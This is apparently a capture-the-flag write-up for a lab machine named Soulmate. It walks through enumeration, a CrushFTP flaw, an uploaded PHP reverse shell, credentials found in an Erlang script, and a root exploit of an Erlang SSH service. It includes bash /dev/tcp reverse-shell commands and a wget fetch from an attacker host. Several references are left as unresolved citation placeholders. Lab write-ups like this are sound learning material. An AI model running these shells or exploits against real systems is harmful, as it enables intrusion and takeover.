# Soulmate Writeup

## 1. Enumeration

### Nmap Scan

```bash
sudo nmap -p- -sC -sV --min-rate 1000 10.129.1.150
```

Open ports discovered:

- 22 (SSH)
- 80 (HTTP)
- 4369 (EPMD)

---

### Host Configuration

Add target to `/etc/hosts`:

```bash
echo "10.129.1.150 soulmate.htb" | sudo tee -a /etc/hosts
```

Access:

```
http://soulmate.htb
```

Website confirmed running.

---

### Virtual Host Enumeration

```bash
gobuster vhost -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u http://soulmate.htb --append-domain
```

Discovered:

```
ftp.soulmate.htb
```

Add to hosts:

```bash
echo "10.129.1.150 ftp.soulmate.htb" | sudo tee -a /etc/hosts
```

---

## 2. Initial Foothold

### CrushFTP Exploitation

Target running:

:contentReference[oaicite:0]{index=0}

Vulnerability identified:

:contentReference[oaicite:1]{index=1}

Exploitation allowed:

- Creation of administrator account
- Password reset for existing users

User `ben` had access to a virtual file system.

---

### Uploading PHP Reverse Shell

Created `shell.php`:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.192/1234 0>&1'"); ?>
```

Upload to:

```
webProd
```

Start listener:

```bash
nc -nvlp 1234
```

Trigger shell:

```bash
curl http://soulmate.htb/shell.php
```

Obtained shell as:

```
www-data
```

---

## 3. User Flag

### Privilege Enumeration

Transfer and execute LinPEAS:

```bash
python3 -m http.server 80
```

On target:

```bash
wget http://<attacker-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Interesting files discovered:

```
/usr/local/sbin/laurel
/usr/local/lib/erlang_login/start.escript
/usr/local/sbin/erlang_login_wrapper
/usr/local/lib/erlang_login/login.escript
```

These appeared related to authentication.

---

### Credential Discovery

Credentials found inside:

```
/usr/local/lib/erlang_login/start.escript
```

SSH access as ben:

```bash
ssh ben@soulmate.htb
```

User flag obtained.

---

## 4. Root Flag

### Discovering Local Erlang Service

The script suggested Erlang running locally on port:

```
2222
```

Since the port was local-only, SSH port forwarding was used.

---

### Local Port Forwarding

```bash
ssh -L 2222:localhost:2222 ben@soulmate.htb
```

Now scan locally forwarded port:

```bash
sudo nmap -sC -sV -p 2222 localhost
```

Discovered service:

```
SSH-2.0-Erlang/5.2.9
```

---

### Exploiting Erlang

Exploit reference:

:contentReference[oaicite:2]{index=2}

Exploit source:

:contentReference[oaicite:3]{index=3}

Start listener:

```bash
nc -nlvp 4444
```

Run exploit:

```bash
python3 exploit.py -t localhost -p 2222 --command "bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"
```

Root shell obtained.

Root flag captured.

---

## What We Learned

### 1. FTP Services Can Lead to Web Compromise

Misconfigured or vulnerable file transfer services may allow file upload leading to RCE.

---

### 2. Internal Services Matter

Locally bound services (like Erlang on 2222) can still be exploited via SSH port forwarding.

---

### 3. Always Enumerate Custom Scripts

Custom authentication wrappers may contain hardcoded credentials.

---

### 4. SSH Port Forwarding Is Extremely Powerful

Local-only services are not safe if an attacker gains SSH access.